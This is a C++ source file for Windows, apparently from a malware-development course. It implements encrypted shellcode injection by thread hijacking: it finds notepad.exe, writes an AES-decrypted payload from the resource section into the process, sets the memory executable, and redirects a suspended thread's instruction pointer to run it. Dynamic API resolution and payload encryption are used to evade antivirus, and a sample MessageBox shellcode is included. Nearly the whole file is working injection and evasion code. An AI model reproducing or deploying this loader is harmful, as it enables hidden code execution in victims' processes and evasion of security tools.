#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include "resource.h"

/*
1. Creating a snapshot of processes running on the system
2. Creating a snapshot of the threads of processes on the system
3. Checking for the thread ID if it matches with parent process ID
4. Allocating memory in remote process where thread will be hijacked
5. Suspending the target thread
6. Context for the thread is obtained and instruction pointer modified to point to allocated memory
7. Thread is resumed to execute the shellcode

It is nice to hijack an existing thread of a process instead of spawning another child process or thread 
however shellcode still persists in memory of the process and can be picked up by AV.

Bizarre behaviour can also be encoutered which might break the parent process entirely so if injection happens in explorer.exe 
for example, then the process might die which is bad.

This method might render an application/program unusable for the user due to the hijacking of a main thread.
*/

LPVOID(WINAPI* pVirtualAllocExNuma)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nndPreferred);
BOOL(WINAPI* pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
BOOL(WINAPI* pVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
HANDLE(WINAPI* pOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
HANDLE(WINAPI* pOpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);

HMODULE libHM = LoadLibraryW(L"kernel32.dll");

// MessageBox shellcode - 64-bit (exitfunc = thread)
//         - >> Hello World ! <<
//              UNENCRYPTED
/*
unsigned char shellcode[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
*/

unsigned char key[] = { 0xe, 0x5, 0xc9, 0x95, 0x8a, 0x63, 0x45, 0x1, 0x80, 0xa0, 0xb, 0x70, 0x3f, 0x4b, 0x5c, 0x71 };
DWORD key_len = sizeof(key);

// RTO Mal Dev course
int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    BOOL CryptAcquire = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (CryptAcquire == false) {
        printf("CryptAcquireContextW Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    if (CryptCreate == false) {
        printf("CryptCreateHash Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
    if (CryptHash == false) {
        printf("CryptHashData Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    if (CryptDerive == false) {
        printf("CryptDeriveKey Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);
    if (Crypt_Decrypt == false) {
        printf("CryptDecrypt Failed: %d\n", GetLastError());
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}


// https://stackoverflow.com/a/55030118
DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    DWORD pid = 0;


    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        pid = processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            pid = processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return pid;
}

DWORD FindThread(DWORD pid) {

    // Init THREADENTRY structure and get size of it
    THREADENTRY32 threadInfo;
    threadInfo.dwSize = sizeof(threadInfo);
    
    // Handles and thread id vars
    HANDLE thSnap;

    DWORD thID = NULL;
    HANDLE tHandle = NULL;

    // Take snapshot of threads
    thSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (thSnap == INVALID_HANDLE_VALUE) {
        printf("[-] Snapshot of system threads failed: %d\n", GetLastError());
        return 0;
    }

    // Match PID with found thread ID, break if it does
    while (Thread32Next(thSnap, &threadInfo)) {
        if (threadInfo.th32OwnerProcessID == pid) {
            thID = threadInfo.th32ThreadID;
            break;
        }
    }

    CloseHandle(thSnap);
    return thID;
}

int iCTX(HANDLE pHandle, DWORD processId, unsigned char* payload, SIZE_T scSize) {

    if (libHM == NULL) {
        printf("[-] Can't load Kernel32.DLL\n");
        printf("[-] Error code: %d", GetLastError());
        return -2;
    }

    FreeLibrary(libHM);

    (FARPROC&)pVirtualAllocExNuma = GetProcAddress(libHM, "VirtualAllocExNuma");
    (FARPROC&)pWriteProcessMemory = GetProcAddress(libHM, "WriteProcessMemory");
    (FARPROC&)pVirtualProtectEx = GetProcAddress(libHM, "VirtualProtectEx");
    (FARPROC&)pOpenThread = GetProcAddress(libHM, "OpenThread");

    // init context for thread
    CONTEXT ctx{};

    DWORD oldProtect;
    SIZE_T bytesWritten; //This can be a null pointer in func

    // Find thread ID, set permissions for handle to thread
    DWORD thID = FindThread(processId);
    HANDLE tHandle = pOpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thID);
    if (!tHandle) return 0;// else return tHandle;
    printf("[+] Acquired Thread Handle [ %p ] for Thread [ %d ] \n", tHandle, thID);

    // Allocate memory in process where thread is located
    LPVOID vAlloc = pVirtualAllocExNuma(pHandle, NULL, scSize, MEM_COMMIT, PAGE_READWRITE, 0);
    if (!vAlloc) {
        printf("[-] Allocating memory in thread failed [ %d ]\n", GetLastError());
        return -2;
    }
    printf("[+] Remote Alloc [ %p ]\n", vAlloc);

    AESDecrypt((unsigned char*)payload, (DWORD)scSize, (char*)key, key_len);

    // Write shellcode in memory
    if (!pWriteProcessMemory(pHandle, vAlloc, payload, scSize, &bytesWritten)) {
        printf("[-] Writing shellcode in allocated memory failed [ %d ]\n", GetLastError());
        return -2;
    }


    // Change page protection -> RX
    if (!pVirtualProtectEx(pHandle, vAlloc, scSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] Changing memory protection faield [ %d ]", GetLastError());
        return -2;
    }

    // Suspend the thread
    SuspendThread(tHandle);
    printf("[+] Suspended the Thread [ %d ] of Process [ %d ] successfully\n", (int)thID, (int)processId);

    // Get full thread context
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(tHandle, &ctx);

    // Check if thread is x86 or x64 and set context appropriately.
#ifdef _M_IX86 
    ctx.Eip = (DWORD_PTR)vAlloc;
#else
    ctx.Rip = (DWORD_PTR)vAlloc;
#endif
    
    if (!SetThreadContext(tHandle, &ctx)) {
        printf("[-] Failed setting thread context: %d\n", GetLastError());
        return -2;
    }

    DWORD rThread = ResumeThread(tHandle);
    
    if (!rThread) {
        printf("[-] Cant resume thread: %d\n", GetLastError());
        return -2;
    }

    // Close process handle and free memory;
    CloseHandle(tHandle);

    return rThread;

}


//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
int main()
{
    if (libHM == NULL) {
        printf("[-] Can't load Kernel32.DLL\n");
        printf("[-] Error code: %d", GetLastError());
        return -2;
    }

    (FARPROC&)pVirtualAllocExNuma = GetProcAddress(libHM, "VirtualAllocExNuma");
    (FARPROC&)pOpenProcess = GetProcAddress(libHM, "OpenProcess");

    FreeLibrary(libHM);

    
    unsigned char* shellcode;
    DWORD scSize = sizeof(shellcode);

    // Generate a resource.rc & resource.h poiting to a file of binary (raw) type shellcode
    // .rsrc storage && .rsrc payload extraction

    HRSRC res = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    HGLOBAL resHandle = LoadResource(NULL, res);
    shellcode = (unsigned char*)LockResource(resHandle);
    scSize = SizeofResource(NULL, res);

    auto procPid = FindProcessId(L"notepad.exe");
    if (!procPid) {
        printf("[-] Process not found !");
        return -1;
    }
    printf("[+] Process ID: %d\n", procPid);

    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, false, procPid);

    if (hProcess) {

        // Allocate memory in process where thread is located
        LPVOID Alloc = pVirtualAllocExNuma(GetCurrentProcess(), NULL, scSize, MEM_COMMIT, PAGE_READWRITE, 0);
        if (!Alloc) {
            printf("[-] Allocating memory in thread failed [ %d ]\n", GetLastError());
            return -2;
        }
        printf("[+] Local Alloc [ %p ]\n", Alloc);

        memmove(Alloc, shellcode, scSize);

        iCTX(hProcess, procPid, (unsigned char*)Alloc, scSize);
        CloseHandle(hProcess);
    }

    return 0;
}